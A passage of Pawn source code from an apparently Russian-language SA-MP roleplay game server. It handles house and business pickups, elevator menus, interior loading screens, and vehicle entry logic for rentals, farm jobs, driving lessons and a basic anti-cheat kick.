		if(GetPVarInt(playerid,"Fraction_Duty") && PlayerInfo[playerid][pMember] != 0) return SCM(playerid,COLOR_GREY," Вы не можете использовать гардероб! ( Если вы состоите в гос. организации, переоденьтесь на базе )");
		t_SetPlayerPos(playerid,181.5215,-88.0678,1002.0234);
		SetPlayerFacingAngle(playerid, 92.6158);
		SetPlayerCameraPos(playerid,179.1173,-88.0198,1002.0234);
		SetPlayerCameraLookAt(playerid,179.1173,-88.0198,1002.0234);
		SetPlayerInterior(playerid,18);
		ShowPlayerDialogEx(playerid,10399,DIALOG_STYLE_LIST, "Гардероб","Вешалка №1\nВешалка №2\nВешалка №3\nВешалка №4\nВешалка №5", "Повешать", "Выход");
	}
	for(new h = 1; h <= TotalHouse; h++)
	{
		if(pickupid == HouseInfo[h][hPickup])
		{
			if(strcmp(HouseInfo[h][hOwner],"None",true) != 0)
			{
				new ttextt[32];
				if(IsPlayerConnected(GetPlayerID(HouseInfo[h][hOwner]))) ttextt = "[{22ff00}Online{F2EEF0}]";
				else if(!IsPlayerConnected(GetPlayerID(HouseInfo[h][hOwner]))) ttextt = "[{ff001c}Offline{F2EEF0}]";
				if(HouseInfo[h][hKlass] == 0)format(string, 256, "{FFFFFF}Владелец: %s {F2EEF0}%s\n{FFFFFF}Класс: Nope\n{FFFFFF}Номер дома: %i",HouseInfo[h][hOwner],ttextt,h);
				else if(HouseInfo[h][hKlass] == 1)format(string, 256, "{FFFFFF}Владелец: {F2EEF0}%s %s\n{FFFFFF}Класс: D\n{FFFFFF}Номер дома: %i",HouseInfo[h][hOwner],ttextt,h);
				else if(HouseInfo[h][hKlass] == 2)format(string, 256, "{FFFFFF}Владелец: {F2EEF0}%s %s\n{FFFFFF}Класс: C\n{FFFFFF}Номер дома: %i",HouseInfo[h][hOwner],ttextt,h);
				else if(HouseInfo[h][hKlass] == 3)format(string, 256, "{FFFFFF}Владелец: {F2EEF0}%s %s\n{FFFFFF}Класс: B\n{FFFFFF}Номер дома: %i",HouseInfo[h][hOwner],ttextt,h);
				else if(HouseInfo[h][hKlass] == 4)format(string, 256, "{FFFFFF}Владелец: {F2EEF0}%s %s\n{FFFFFF}Класс: A\n{FFFFFF}Номер дома: %i",HouseInfo[h][hOwner],ttextt,h);
				else format(string, 256, "{FFFFFF}Владелец: %s %s\n{FFFFFF}Класс: S\n{FFFFFF}Номер дома: %i",HouseInfo[h][hOwner],ttextt,h);
				ShowPlayerDialogEx(playerid,10075,DIALOG_STYLE_MSGBOX, "Дом занят",string, "Войти", "Отмена");
				return true;
			}
			else
			{
				if(HouseInfo[h][hKlass] == 0)
				{
					format(string, 256, "{FFFFFF}Стоимость: %i\n{FFFFFF}Класс: Nope\n{FFFFFF}Номер дома: %i\n{FFFFFF}Введите: /buyhouse чтобы купить дом",HouseInfo[h][hValue],h);
				}
				else if(HouseInfo[h][hKlass] == 1)
				{
					format(string, 256, "{FFFFFF}Стоимость: %i\n{FFFFFF}Класс: D\n{FFFFFF}Номер дома: %i\n{FFFFFF}Введите: /buyhouse чтобы купить дом",HouseInfo[h][hValue],h);
				}
				else if(HouseInfo[h][hKlass] == 2)
				{
					format(string, 256, "{FFFFFF}Стоимость: %i\n{FFFFFF}Класс: C\n{FFFFFF}Номер дома: %i\n{FFFFFF}Введите: /buyhouse чтобы купить дом",HouseInfo[h][hValue],h);
				}
				else if(HouseInfo[h][hKlass] == 3)
				{
					format(string, 256, "{FFFFFF}Стоимость: %i\n{FFFFFF}Класс: B\n{FFFFFF}Номер дома: %i\n{FFFFFF}Введите: /buyhouse чтобы купить дом",HouseInfo[h][hValue],h);
				}
				else if(HouseInfo[h][hKlass] == 4)
				{
					format(string, 256, "{FFFFFF}Стоимость: %i\n{FFFFFF}Класс: A\n{FFFFFF}Номер дома: %i\n{FFFFFF}Введите: /buyhouse чтобы купить дом",HouseInfo[h][hValue],h);
				}
				else
				{
					format(string, 256, "{FFFFFF}Стоимость: %i\n{FFFFFF}Класс: S\n{FFFFFF}Номер дома: %i\n{FFFFFF}Введите: /buyhouse чтобы купить дом",HouseInfo[h][hValue],h);
				}
				ShowPlayerDialogEx(playerid,10026,DIALOG_STYLE_MSGBOX, "Дом свободен",string, "Войти", "Отмена");
				return true;
			}
		}
	}
	for(new b = 1; b <= TotalBizz; b++)
	{
		if(pickupid == BizzInfo[b][bEnterPic])
		{
			if(strcmp(BizzInfo[b][bOwner],"None",true) == 0)
			{
				PickupX[playerid] = BizzInfo[b][bExitX], PickupY[playerid] = BizzInfo[b][bExitY];
				oldpickup[playerid] = BizzInfo[b][bEnterPic];
				timepickup[playerid] = 8;
				SetPlayerInterior(playerid,BizzInfo[b][bInterior]);
				SetPlayerPos(playerid,BizzInfo[b][bExitX],BizzInfo[b][bExitY],BizzInfo[b][bExitZ]);
				SetPlayerVirtualWorld(playerid,BizzInfo[b][bVirtualWorld]);
				return true;
			}
			if(BizzInfo[b][bType] == 1)
			{
				if(enterbiz[playerid] != b && PlayerInfo[playerid][pPBizzKey] != b)
				{
					if(BizzInfo[b][bLocked] == 1)
					{
						SCM(playerid, COLOR_GRAD1, "Бизнес закрыт");
						return true;
					}
					format(string,100, "Цена входа %i вирт\nВы хотите войти?",BizzInfo[b][bEntranceCost]);
					ShowPlayerDialogEx(playerid,9898,DIALOG_STYLE_MSGBOX, "Вход",string, "Да", "Отмена");
					return true;
				}
				else
				{
					PickupX[playerid] = BizzInfo[b][bExitX], PickupY[playerid] = BizzInfo[b][bExitY];
					oldpickup[playerid] = BizzInfo[b][bEnterPic];
					timepickup[playerid] = 8;
					SetPlayerInterior(playerid,BizzInfo[b][bInterior]);
					SetPlayerPos(playerid,BizzInfo[b][bExitX],BizzInfo[b][bExitY],BizzInfo[b][bExitZ]);
					SetPlayerVirtualWorld(playerid,BizzInfo[b][bVirtualWorld]);
					return true;
				}
			}
			else
			{
				if(BizzInfo[b][bLocked] == 1)
				{
					SCM(playerid, COLOR_GRAD1, "Бизнес закрыт");
					return true;
				}
				PickupX[playerid] = BizzInfo[b][bExitX], PickupY[playerid] = BizzInfo[b][bExitY];
				oldpickup[playerid] = BizzInfo[b][bEnterPic];
				timepickup[playerid] = 8;
				SetPlayerInterior(playerid,BizzInfo[b][bInterior]);
				SetPlayerPos(playerid,BizzInfo[b][bExitX],BizzInfo[b][bExitY],BizzInfo[b][bExitZ]);
				SetPlayerVirtualWorld(playerid,BizzInfo[b][bVirtualWorld]);
				return true;
			}
		}
		else if(pickupid == BizzInfo[b][bExitPic])
		{
			PickupX[playerid] = BizzInfo[b][bEntranceX], PickupY[playerid] = BizzInfo[b][bEntranceY];
			oldpickup[playerid] = BizzInfo[b][bExitPic];
			timepickup[playerid] = 8;
			SetPlayerInterior(playerid,0);
			SetPlayerPos(playerid,BizzInfo[b][bEntranceX],BizzInfo[b][bEntranceY],BizzInfo[b][bEntranceZ]);
			SetPlayerVirtualWorld(playerid,0);
			return true;
		}
		else if(pickupid == BizzInfo[b][bPickup] && PlayerToPoint(2.0,playerid,BizzInfo[b][bBarX],BizzInfo[b][bBarY],BizzInfo[b][bBarZ])) GameTextForPlayer(playerid, "~w~Print:~g~\"/eat\"", 5000, 3);
	}
	if(pickupid == podeezdi)
	{
		new i = GetPVarInt(playerid, "podeezd");
		PickupX[playerid] = PodeezdInfo[i][podPicX], PickupY[playerid] = PodeezdInfo[i][podPicY];
		oldpickup[playerid] = PodeezdInfo[i][podPic];
		timepickup[playerid] = 8;
		SetPlayerPos(playerid, PodeezdInfo[i][podPicX],PodeezdInfo[i][podPicY],PodeezdInfo[i][podPicZ]);
		SetPlayerInterior(playerid,0);
		SetPlayerVirtualWorld(playerid,0);
		DeletePVar(playerid, "podeezd");
		return true;
	}
	for(new g = 1; g <= AllPODEZD; g++)
	{
		if(pickupid == PodeezdInfo[g][podPic])
		{
			SetPVarInt(playerid, "podeezd",g);
			new str[8], varv[100];
			strcat(varv,"Парковка\n");
			for(new f = 1; f <= PodeezdInfo[g][podEtazi]; f++)
			{
				format(str, 10, "%i этаж\n", f);
				strcat(varv,str);
			}
			return ShowPlayerDialogEx(playerid, 8999, 2, "Лифт", varv, "Перейти", "Закрыть");
		}
 	}
	SetCameraBehindPlayer(playerid);
	return true;
}
forward LoadInterior(playerid);
public LoadInterior(playerid)
{
	TogglePlayerControllable(playerid, 0);
	TextDrawShowForPlayer(playerid, IntLoad_TD[0]);
	TextDrawShowForPlayer(playerid, IntLoad_TD[1]);
	TextDrawShowForPlayer(playerid, IntLoad_TD[2]);
	TextDrawShowForPlayer(playerid, IntLoad_TD[3]);
	new interval;
	if(GetPlayerPing(playerid) > 500) interval = 3500;
	else if(GetPlayerPing(playerid) > 200) interval = 2500;
	else if(GetPlayerPing(playerid) > 100) interval = 2000;
	else if(GetPlayerPing(playerid) > 0) interval = 1500;
	SetTimerEx("LoadInteriorNext", interval, false, "d", playerid);
}

forward LoadInteriorNext(playerid);
public LoadInteriorNext(playerid)
{
    TextDrawHideForPlayer(playerid, IntLoad_TD[3]);
    TextDrawShowForPlayer(playerid, IntLoad_TD[4]);
    new interval;
	if(GetPlayerPing(playerid) > 500) interval = 3500;
	else if(GetPlayerPing(playerid) > 200) interval = 2500;
	else if(GetPlayerPing(playerid) > 100) interval = 2000;
	else if(GetPlayerPing(playerid) > 0) interval = 1500;
	SetTimerEx("LoadInteriorFinished", interval, false, "d", playerid);
	return true;
}

forward LoadInteriorFinished(playerid);
public LoadInteriorFinished(playerid)
{
    TextDrawHideForPlayer(playerid, IntLoad_TD[0]);
	TextDrawHideForPlayer(playerid, IntLoad_TD[1]);
	TextDrawHideForPlayer(playerid, IntLoad_TD[2]);
	TextDrawHideForPlayer(playerid, IntLoad_TD[4]);
	TogglePlayerControllable(playerid, 1);
	return true;
}
public OnPlayerExitedMenu(playerid)
{
	if(!IsValidMenu(GetPlayerMenu(playerid))) return true;
	ShowMenuForPlayer(GetPlayerMenu(playerid), playerid);
	TogglePlayerControllable(playerid,0);
	return true;
}
publics: SetAllPlayerCheckpoint(Float:allx, Float:ally, Float:allz, Float:radi, num)
{
	foreach(i)
	{
		SetPlayerCheckpoint(i,allx,ally,allz, radi);
		if (num != 255) gPlayerCheckpointStatus[i] = num;
	}
}
publics: SetAllCopCheckpoint(Float:allx, Float:ally, Float:allz, Float:radi)
{
	foreach(i)
	{
		if(IsAArm(i))
		{
			SetPlayerCheckpoint(i,allx,ally,allz, radi);
		}
	}
	return true;
}
publics: UnSurfCar(carid)
{
	foreach(i)
	{
		new model = GetVehicleModel(carid);
		if(model != 430 && model != 454 &&
				model != 478 && model != 446 &&
				model != 452 && model != 453 &&
				model != 454 && model != 472 &&
				model != 473 && model != 484 &&
				model != 493 && model != 539 &&
				model != 595)
		if(GetPlayerSurfingVehicleID(i) == carid)
		{
			new Float:p[0x3]; GetPlayerPos(IsVehicleOccupied(GetPlayerSurfingVehicleID(i)),p[0x0],p[0x1],p[0x2]);
			GetXYInBackOfPlayer(i,p[0x0],p[0x1],3.0);
			t_SetPlayerPos(i,p[0x0],p[0x1],p[0x2]);
		}
	}
	return;
}
stock GetVehicleRotation(vehicleid,&Float:x,&Float:y,&Float:z) {
	new Float:quat_w,Float:quat_x,Float:quat_y,Float:quat_z;
	GetVehicleRotationQuat(vehicleid,quat_w,quat_x,quat_y,quat_z);
	x = atan2(2*((quat_x*quat_y)+(quat_w+quat_z)),(quat_w*quat_w)+(quat_x*quat_x)-(quat_y*quat_y)-(quat_z*quat_z));
	y = atan2(2*((quat_y*quat_z)+(quat_w*quat_x)),(quat_w*quat_w)-(quat_x*quat_x)-(quat_y*quat_y)+(quat_z*quat_z));
	z = asin(-2*((quat_x*quat_z)+(quat_w*quat_y)));
	return 1;
}
public OnPlayerStateChange(playerid, newstate, oldstate)
{
	if(SERVERTEST) SendMes(playerid,COLOR_BLUE,"NEWSTATE - %i, OLDSTATE - %i",newstate,oldstate);
	new tacha = GetPlayerVehicleID(playerid);
	SetPVarInt(playerid, "GunCheckTime", 2);
	if(newstate == 2) SetPVarInt(playerid,"AC_MCS",GetTickCount());
	if(oldstate == PLAYER_STATE_ONFOOT && newstate == PLAYER_STATE_DRIVER) GetVehicleHealth(GetPlayerVehicleID(playerid), last_vehicle_health[playerid]);
	else if(oldstate == PLAYER_STATE_DRIVER && newstate == PLAYER_STATE_ONFOOT) last_vehicle_health[playerid] = -1;
	if(oldstate == PLAYER_STATE_DRIVER)
	{
		KillTimer(timer2[playerid]);
	}
	if(SpecID[playerid] != INVALID_PLAYER_ID)
	{
		if(Spectate[SpecID[playerid]] == 1 && SpecAd[SpecID[playerid]] == playerid)
		{
			StartSpectate(SpecID[playerid],playerid);
		}
	}
	new caridi = GetPlayerVehicleID(playerid);
	//if(newstate == PLAYER_STATE_DRIVER && Type == 2) Timerkk[playerid] = SetTimerEx("UnSurfCar",1600,1, "i",GetPlayerVehicleID(playerid));
	if(newstate == PLAYER_STATE_ONFOOT)
	{
		new Veh = GetPlayerVehicleID(playerid);
		car_ex[Veh] = true;
		GetVehiclePos(Veh,car_coord[Veh][0],car_coord[Veh][1],car_coord[Veh][2]);
		GetVehicleZAngle(Veh,car_coord[Veh][3]);
		if(GetPVarInt(playerid,"farm_status") == 3 || GetPVarInt(playerid,"farm_status") == 5) DisablePlayerRaceCheckpoint(playerid), DeletePVar(playerid,"farm_status");
		if(PlayerInfo[playerid][pJob] == 2)
		{
			if(gcontract[playerid] == 1)
			{
				Delete3DTextLabel(Meh3d[GetPlayerVehicleID(playerid)]);
				gcontract[playerid] = 0;
			}
		}
		if(GetPVarInt(playerid, "TypeBus") > 0)
		{
			SCM(playerid, COLOR_LIGHTRED, "У вас есть 40 секунд, чтобы вернуться");
			SetPVarInt(playerid, "BusTime", 40);
		}
		if(TalkingLive[playerid] == 2)
		{
			SCM(playerid, 0x6495EDFF, "Прямой эфир завершён");
			SCM(TalkingLive[playerid], 0x6495EDFF, "Прямой эфир завершён");
			TogglePlayerControllable(playerid, 1);
			TogglePlayerControllable(TalkingLive[playerid], 1);
			TalkingLive[TalkingLive[playerid]] = 255;
			TalkingLive[playerid] = 255;
			return true;
		}
		else if(TalkingLivels[playerid] == 2)
		{
			SCM(playerid, 0x6495EDFF, "Прямой эфир завершён");
			SCM(TalkingLivels[playerid], 0x6495EDFF, "Прямой эфир завершён");
			TogglePlayerControllable(playerid, 1);
			TogglePlayerControllable(TalkingLivels[playerid], 1);
			TalkingLivels[TalkingLivels[playerid]] = 255;
			TalkingLivels[playerid] = 255;
			return true;
		}
		else if(TalkingLivelv[playerid] == 2)
		{
			SCM(playerid, 0x6495EDFF, "Прямой эфир завершён");
			SCM(TalkingLivelv[playerid], 0x6495EDFF, "Прямой эфир завершён");
			TogglePlayerControllable(playerid, 1);
			TogglePlayerControllable(TalkingLivelv[playerid], 1);
			TalkingLivelv[TalkingLivelv[playerid]] = 255;
			TalkingLivelv[playerid] = 255;
			return true;
		}
	}
	if(newstate == PLAYER_STATE_DRIVER)
	{
		if(!IsAPlane(tacha) && !IsABoat(tacha) && !IsABike(tacha) && AutoSaloon[playerid] != true)
		{
			if(PlayerInfo[playerid][pDrivingSkill] < 2) PlayerInfo[playerid][pDrivingSkill] = 1;
			PlayerTextDrawSetString(playerid,LimitShow[playerid],"~r~MAX");
			TextDrawShowForPlayer(playerid,Speed);
			PlayerTextDrawShow(playerid,SpeedShow[playerid]);
			PlayerTextDrawShow(playerid,FuelShow[playerid]);
			PlayerTextDrawShow(playerid,StatusShow[playerid]);
			PlayerTextDrawShow(playerid,KMShow[playerid]);// СПИДОМЕТР
			PlayerTextDrawShow(playerid,LimitShow[playerid]);
			PlayerTextDrawShow(playerid,FillShow[playerid]);
			TextDrawShowForPlayer(playerid, BoxPanel);
			GetVehicleParamsEx(GetPlayerVehicleID(playerid),engine,lights,alarm,doors,bonnet,boot,objective);
			if(doors) PlayerTextDrawColor(playerid,StatusShow[playerid], -16776961), PlayerTextDrawSetString(playerid,StatusShow[playerid],"Lock"), PlayerTextDrawShow(playerid,StatusShow[playerid]);
			else PlayerTextDrawColor(playerid,StatusShow[playerid], 0x20B220AA), PlayerTextDrawSetString(playerid,StatusShow[playerid],"Unlock"), PlayerTextDrawShow(playerid,StatusShow[playerid]);
			if(vehicleidtp[playerid] != tacha && PlayerInfo[playerid][pAdmin] == 0)
			{
				return 1;
			}
			else vehicleidtp[playerid] = INVALID_VEHICLE_ID;
		}
	}
	else if(newstate == PLAYER_STATE_ONFOOT)
	{
		if(!IsAPlane(tacha) && !IsABoat(tacha) && !IsABike(tacha))
		{
			TextDrawHideForPlayer(playerid,Speed);
			PlayerTextDrawHide(playerid,SpeedShow[playerid]);
			PlayerTextDrawHide(playerid,FuelShow[playerid]);
			PlayerTextDrawHide(playerid,StatusShow[playerid]);
			PlayerTextDrawHide(playerid,KMShow[playerid]);
			PlayerTextDrawHide(playerid,LimitShow[playerid]);
			PlayerTextDrawHide(playerid,FillShow[playerid]);
			TextDrawHideForPlayer(playerid, BoxPanel);
		}
	}
	if(newstate == 2)
	{
		if(GetPVarInt(playerid, "EnterVehTime") > GetTickCount())
		{
			if(PlayerInfo[playerid][pAdmin] < 2)
			{
				if(GetPVarInt(playerid,"WarningCheat") < 1)
				{
					SCM(playerid,COLOR_LIGHTRED,"Вы были кикнуты по подозрению в читерстве! (#001)");
					SetPVarInt(playerid, "WarningCheat", 15);
					Kick(playerid);
				}
			}
		}
		SetPVarInt(playerid, "EnterVehTime", GetTickCount() + 950);
	}
	if(newstate == PLAYER_STATE_DRIVER)
	{
		if(avtocar[playerid] != 0 && PlayerInfo[playerid][pJob] == 65)
		{
			if(caridi == avtocar[playerid])
			{
				rabotaon[playerid] = 1;
				new rand = random(sizeof(acarsd));
				SCM(playerid, COLOR_BLUE, "[SMS]: Это то что нам нужно! Гони её на склад!");
				SetPlayerCheckpoint(playerid,acarsd[rand][0],acarsd[rand][1],acarsd[rand][2],8);
				GangZoneDestroy(gangzonesa[playerid]);
			}
		}
		if(Fuell[caridi] <= 0 && GetVehicleModel(GetPlayerVehicleID(playerid)) != 462)
		{
			SCM(playerid, COLOR_RED, " Двигатель не заводится");
			SCM(playerid, COLOR_GREEN, " {00A86B}Используйте телефон {FFFFFF}(( /call )){00A86B} чтобы вызвать механика / таксиста");
			SCM(playerid, COLOR_GREEN, " {00A86B}Если у вас есть канистра с бензином, введите {FFFFFF}(( /fillcar ))");
			Fuell[caridi] = 0;
		}
		if(GetVehicleModel(caridi) == 481 || GetVehicleModel(caridi) == 509 || GetVehicleModel(caridi) == 510)
		{
			GetVehicleParamsEx(caridi,engine,lights,alarm,doors,bonnet,boot,objective);
			SetVehicleParamsEx(caridi,true,lights,alarm,doors,bonnet,boot,objective);
		}
		else
		{
			GetVehicleParamsEx(caridi,engine,lights,alarm,doors,bonnet,boot,objective);
			if(!engine && PlayerInfo[playerid][SalonCar] != caridi) SCM(playerid, -1, "{00AB06} Чтобы завести двигатель нажмите клавишу {FFFFFF}'2'{00AB06} или введите команду {FFFFFF}/en");
		}
		if(GetVehicleModel(caridi) == 482)
  		{
			switch(PlayerInfo[playerid][pMember])
			{
			    case 12: format(string, 128, " Материалы: %i/%i", Furi[0][gBallas], maxMats[gBallas]);
			    case 13: format(string, 128, " Материалы: %i/%i", Furi[0][gVagos], maxMats[gVagos]);
			    case 15: format(string, 128, " Материалы: %i/%i", Furi[0][gGrove], maxMats[gGrove]);
			    case 17: format(string, 128, " Материалы: %i/%i", Furi[0][gAztek], maxMats[gAztek]);
			    case 18: format(string, 128, " Материалы: %i/%i", Furi[0][gRifa], maxMats[gRifa]);
			}
			SCM(playerid, TEAM_GROVE_COLOR, string);
  		}
	}
	if(newstate == PLAYER_STATE_PASSENGER)
	{
		new vehicleid = GetPlayerVehicleID(playerid);
		GetVehicleParamsEx(vehicleid,engine,lights,alarm,doors,bonnet,boot,objective);
		if(doors == 1 && house_car[playerid] != vehicleid && IsABike(playerid)) RemovePlayerFromVehicleAC(playerid);
		foreach(i)
		{
			if(IsPlayerInVehicle(i, GetPlayerVehicleID(playerid)) && GetPlayerState(i) == 2 && GetPVarInt(i,"TaxiDuty") > 0)
			{
				if(GetPVarInt(i,"Taxi_") == 0)
				{
					format(string, sizeof(string), " Пассажир %s сел в ваше Такси. Довезите его и государство заплатит вам",PlayerInfo[playerid][pName]);
					SCM(i, COLOR_BLUE, string);
					SetPVarInt(i,"Taxi_",playerid+1);
					if(PlayerInfo[playerid][pLevel] == 1 && PlayerInfo[playerid][pExp] < 4) CallLocalFunction("OnPlayerCommandText", "is", i, "/taxigps");
				}
				break;
			}
		}
	}
	if(newstate == PLAYER_STATE_DRIVER)
	{
		new newcar = GetPlayerVehicleID(playerid);
		TelePos[playerid][0] = 0.0;
		TelePos[playerid][1] = 0.0;
		if(IsAGunsCar(newcar))
		{
			format(string, 60, " Материалов: %i/10000", MatHaul[newcar-gunscar[0]][mLoad],MatHaul[newcar-gunscar[0]][mCapasity]);
			SCM(playerid, TEAM_GROVE_COLOR, string);
			SCM(playerid, -1, " Введите: /ConveyingArms (/carm)");
		}
		for(new i = 0; i <= TOTALFARM; i++)
		{
			if(newcar >= FarmInfo[i][fSeed_Car][0] && newcar <= FarmInfo[i][fSeed_Car][1])
			{
				if(GetPVarInt(playerid,"farm_rank") <= 1 || GetPVarInt(playerid,"farm_id") != i) return RemovePlayerFromVehicleAC(playerid),SCM(playerid, COLOR_GREY, " Вам недоступен данный транспорт");
				if(Farmcar_works[newcar]) ShowPlayerDialogEx(playerid,1345,DIALOG_STYLE_MSGBOX, " ","{00C8FF}Вы желаете завершить сбор урожая?", "Да", "Нет"),SendMes(playerid, TEAM_GROVE_COLOR," {00AB06}Урожая в машине: %d / 1000",Farmcar_prods[newcar]);
				else ShowPlayerDialogEx(playerid,1345,DIALOG_STYLE_MSGBOX, " ","{25BB00}Вы желаете начать сбор урожая?", "Да", "Нет"),SendMes(playerid, TEAM_GROVE_COLOR," {00AB06}Урожая в машине: %d / 1000",Farmcar_prods[newcar]);
			}
			else if(newcar == FarmInfo[i][fCombine])
			{
				if(GetPVarInt(playerid,"farm_rank") <= 1 || GetPVarInt(playerid,"farm_id") != i) return RemovePlayerFromVehicleAC(playerid),SCM(playerid, COLOR_GREY, " Вам недоступен данный транспорт");
				new idx = GetPVarInt(playerid,"farm_id");
				if(FarmInfo[idx][fGrain_Sown] > 0) return RemovePlayerFromVehicleAC(playerid),SCM(playerid, COLOR_GREY, "На поле ещё есть урожай");
				if(FarmInfo[idx][fGrain] <= 0) return RemovePlayerFromVehicleAC(playerid),SCM(playerid, COLOR_GREY, "На складе фермы недостаточно зерна");
				SetPVarInt(playerid,"farm_status",5);
				DeletePVar(playerid,"farm_combine");
				switch(GetPVarInt(playerid,"farm_id"))
				{
				case 1: SetPlayerRaceCheckpoint(playerid,0,Farmcombine_coord_one[GetPVarInt(playerid,"farm_combine")][0],Farmcar_coord_one[GetPVarInt(playerid,"farm_combine")][1],Farmcar_coord_one[GetPVarInt(playerid,"farm_combine")][2],Farmcombine_coord_one[GetPVarInt(playerid,"farm_combine")+1][0],Farmcar_coord_one[GetPVarInt(playerid,"farm_combine")+1][1],Farmcar_coord_one[GetPVarInt(playerid,"farm_combine")+1][2],5.0);
				case 2: SetPlayerRaceCheckpoint(playerid,0,Farmcombine_coord_two[GetPVarInt(playerid,"farm_combine")][0],Farmcar_coord_two[GetPVarInt(playerid,"farm_combine")][1],Farmcar_coord_two[GetPVarInt(playerid,"farm_combine")][2],Farmcombine_coord_two[GetPVarInt(playerid,"farm_combine")+1][0],Farmcar_coord_two[GetPVarInt(playerid,"farm_combine")+1][1],Farmcar_coord_two[GetPVarInt(playerid,"farm_combine")+1][2],5.0);
				case 3: SetPlayerRaceCheckpoint(playerid,0,Farmcombine_coord_three[GetPVarInt(playerid,"farm_combine")][0],Farmcar_coord_three[GetPVarInt(playerid,"farm_combine")][1],Farmcar_coord_three[GetPVarInt(playerid,"farm_combine")][2],Farmcombine_coord_three[GetPVarInt(playerid,"farm_combine")+1][0],Farmcar_coord_three[GetPVarInt(playerid,"farm_combine")+1][1],Farmcar_coord_three[GetPVarInt(playerid,"farm_combine")+1][2],5.0);
				case 4: SetPlayerRaceCheckpoint(playerid,0,Farmcombine_coord_four[GetPVarInt(playerid,"farm_combine")][0],Farmcar_coord_four[GetPVarInt(playerid,"farm_combine")][1],Farmcar_coord_four[GetPVarInt(playerid,"farm_combine")][2],Farmcombine_coord_four[GetPVarInt(playerid,"farm_combine")+1][0],Farmcar_coord_four[GetPVarInt(playerid,"farm_combine")+1][1],Farmcar_coord_four[GetPVarInt(playerid,"farm_combine")+1][2],5.0);
				case 5: SetPlayerRaceCheckpoint(playerid,0,Farmcombine_coord_five[GetPVarInt(playerid,"farm_combine")][0],Farmcar_coord_five[GetPVarInt(playerid,"farm_combine")][1],Farmcar_coord_five[GetPVarInt(playerid,"farm_combine")][2],Farmcombine_coord_five[GetPVarInt(playerid,"farm_combine")+1][0],Farmcar_coord_five[GetPVarInt(playerid,"farm_combine")+1][1],Farmcar_coord_five[GetPVarInt(playerid,"farm_combine")+1][2],5.0);
				}
			}
		}
		if(newcar == mavlic)
		{
			if (GetPVarInt(playerid,"Fraction_Duty") && PlayerInfo[playerid][pMember] == 11) { }
			else
			{
				SCM(playerid,COLOR_GREY, " Вы не школьный инструктор!");
				RemovePlayerFromVehicleAC(playerid);
			}
		}
		if(newcar >= liccar[0] && newcar <= liccar[9])
		{
			if (GetPVarInt(playerid,"Fraction_Duty") && PlayerInfo[playerid][pMember] == 11 || TakingLesson[playerid] == 1 ) { }
			else
			{
				SCM(playerid,COLOR_GREY, " Вы не школьный инструктор!");
				RemovePlayerFromVehicleAC(playerid);
			}
		}
		if(newcar >= liccar[0] && newcar <= liccar[9])
		{
			if(PlayerInfo[playerid][pCarLic] == 0 && TakingLesson[playerid] == 1)
			{
				LessonStat[playerid]++;
				pLessonCar[playerid] = CHECKPOINT_1;
				SetPlayerRaceCheckpoint(playerid,0,-2056.8748,-97.6126,32.9113,-2047.1299,-82.7046,32.9072,5.0);
				SCM(playerid, 0x6495EDFF, "Используйте гудок для поднятия шлагбаума");
				SCM(playerid, 0x6495EDFF, "Чтобы прервать экзамен /endlesson");
			}
		}
		if(newcar >= armycarsf[13] && newcar <= armycarsf[15])
		{
			if(PlayerInfo[playerid][pMember] == 3)
			{
				SCM(playerid, COLOR_GREEN, "Учебный вертолет армии San Fierro");
			}
		}
		if(newcar >= rentcarvip[0] && newcar <= rentcarvip[8])
		{
			if(arenda[playerid] != newcar)
			{
				ShowPlayerDialogEx(playerid,9125,DIALOG_STYLE_MSGBOX, "Аренда транспорта", "Стоимость аренды: {FFFF00}10000 вирт", "Оплатить", "Отмена");
				TogglePlayerControllable(playerid, 0);
			}
		}
		if(newcar >= rentcarsf[0] && newcar <= rentcarsf[6])
		{
			if(arenda[playerid] != newcar)
			{
				ShowPlayerDialogEx(playerid,9126,DIALOG_STYLE_MSGBOX, "Аренда транспорта", "Стоимость аренды: {FFFF00}1500 вирт", "Оплатить", "Отмена");
				TogglePlayerControllable(playerid, 0);
			}
		}
		if(newcar >= rentcarls[0] && newcar <= rentcarls[8])
		{
			if(arenda[playerid] != newcar)
			{
				ShowPlayerDialogEx(playerid,9126,DIALOG_STYLE_MSGBOX, "Аренда транспорта", "Стоимость аренды: {FFFF00}1500 вирт", "Оплатить", "Отмена");
				TogglePlayerControllable(playerid, 0);
			}
		}
		if(newcar >= rentcarlv[0] && newcar <= rentcarlv[17])
		{
			if(arenda[playerid] != newcar)
			{
				ShowPlayerDialogEx(playerid,9126,DIALOG_STYLE_MSGBOX, "Аренда транспорта", "Стоимость аренды: {FFFF00}1500 вирт", "Оплатить", "Отмена");
				TogglePlayerControllable(playerid, 0);
			}
		}
		new car = GetPlayerVehicleID(playerid);
		if(car >= PetrolTanker[0] && car <= PetrolTanker[5])
		{
			if(jobcar[car] == false)
			{
				if(PlayerInfo[playerid][pJob] == 99)
				{
					TogglePlayerControllable(playerid, 0);
					ShowPlayerDialogEx(playerid,32000,0, "Аренда транспорта", "Стоимость аренды: {FFFF00}15000 вирт", "Оплатить", "Отмена");
				}
				else
				{
					SCM(playerid, COLOR_GREY, " Транспорт недоступен! Вы должны устроиться на работу: Дальнобойщик");
					RemovePlayerFromVehicleAC(playerid);
					TogglePlayerControllable(playerid, 1);
				}
			}
		}
		if(car >= Linerunner[0] && car <= Linerunner[1])
		{
			if(jobcar[car] == false)
			{
				TogglePlayerControllable(playerid, 0);
				if(PlayerInfo[playerid][pJob] == 99)
				{
					ShowPlayerDialogEx(playerid,32000,0, "Аренда транспорта", "Стоимость аренды: {FFFF00}10000 вирт", "Оплатить", "Отмена");
				}
				else
				{
					SCM(playerid, COLOR_GREY, " Транспорт недоступен! Вы должны устроиться на работу: Дальнобойщик");
					RemovePlayerFromVehicleAC(playerid);
					TogglePlayerControllable(playerid, 1);
				}
			}
		}
		if(car >= Tanker[0] && car <= Tanker[11])
		{
			if(jobcar[car] == false)
			{
				TogglePlayerControllable(playerid, 0);
				if(PlayerInfo[playerid][pJob] == 99)
				{
					ShowPlayerDialogEx(playerid,32000,0, "Аренда транспорта", "Стоимость аренды: {FFFF00}5000 вирт", "Оплатить", "Отмена");
				}
				else
				{
					SCM(playerid, COLOR_GREY, " Транспорт недоступен! Вы должны устроиться на работу: Дальнобойщик");
					RemovePlayerFromVehicleAC(playerid);
					TogglePlayerControllable(playerid, 1);
				}
			}
		}
		if(car >= Roadtrain[0] && car <= Roadtrain[5])
		{
			if(jobcar[car] == false)
			{
				ShowPlayerDialogEx(playerid,32000,0, "Аренда транспорта", "Стоимость аренды: {FFFF00}20000 вирт", "Оплатить", "Отмена");
